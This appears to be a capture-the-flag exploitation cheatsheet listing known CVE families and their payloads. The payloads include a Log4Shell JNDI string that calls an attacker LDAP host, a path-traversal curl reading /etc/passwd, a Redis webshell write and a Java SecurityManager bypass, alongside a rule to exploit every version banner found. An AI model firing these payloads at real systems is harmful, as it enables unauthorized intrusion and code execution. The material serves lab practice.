# CVE / Version Triage Cheatsheet

## Rule
A version banner without a corresponding exploit attempt is wasted recon. Banner →
search pattern → adapted exploit within the same session.

## Recurring families (CTF favorites)
- Flask/Werkzeug < 0.15 debugger PIN → `/console` RCE with predictable PIN
  (inputs: username, modname=flask.app, appname=flask, /etc/machine-id, MAC of eth0).
- Log4Shell: `${jndi:ldap://ATTACKER/a}` in ANY header; CTF often just needs
  `${jndi:ldap://127.0.0.1:1389/a}` ping observed in logs.
- Spring4Shell / SpEL injection: `class.module.classLoader` param tampering.
- Apache path confusion (CVE-2021-41773): `curl --path-as-is /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd`.
- Sudo < 1.9.5p2 (Baron Samedit), CVE-2021-4034 (pwnkit), CVE-2022-0847 (dirty pipe)
  — check `sudo --version`, kernel `uname -r` on privesc.
- Rsync/Redis/Memcached unauth → RCE chains: redis `SLAVEOF` module load or
  `CONFIG SET dir` webshell write.
- Node: prototype pollution in query merges → `?__proto__[admin]=1` / gadget RCE
  (ejs, handlebars compile).

## Exploit adaptation discipline
1. Public PoC runs against a slightly different version → read the diff of the
   vulnerable function, adjust offsets/paths yourself; do not paste-and-pray.
2. No public PoC → the advisory patch diff IS the exploit hint: patch = the bug.

## Exploit-DoS hygiene (measured: a bad payload can HANG the service, not just fail)
1. Fire the exploit, then IMMEDIATELY probe with a benign request (e.g. the same
   `1+1`-style health check). If it stops responding: do NOT poll-and-wait for
   recovery — the platform may never restart the container mid-slice. Log it and
   pivot: alternate endpoints, other services on the host, other ports.
2. Sandbox-escape RCEs that swap security machinery (Java SecurityManager /
   Gremlin script engines / Python audit hooks) MUST restore it inside the same
   script: without the restore the worker thread/pool wedges and every later
   request hangs. Keep payloads minimal — one action per request.
3. Gremlin/Java script endpoints (HugeGraph <1.3.0 CVE-2024-27348, JanusGraph,
   GraphDB consoles): classic bypass = `Thread.currentThread()` reflection chain
   to Class.forName + newInstance; end with restoring the original
   SecurityManager / removing the blacklist. Confirm RCE with a benign
   `System.getProperty("user.name")` BEFORE hunting flags, and keep a working
   payload string in a variable for reuse.
4. Response bodies may be gzip-encoded (`--compressed` on curl) — parse after
   decompress, never grep raw gzip.
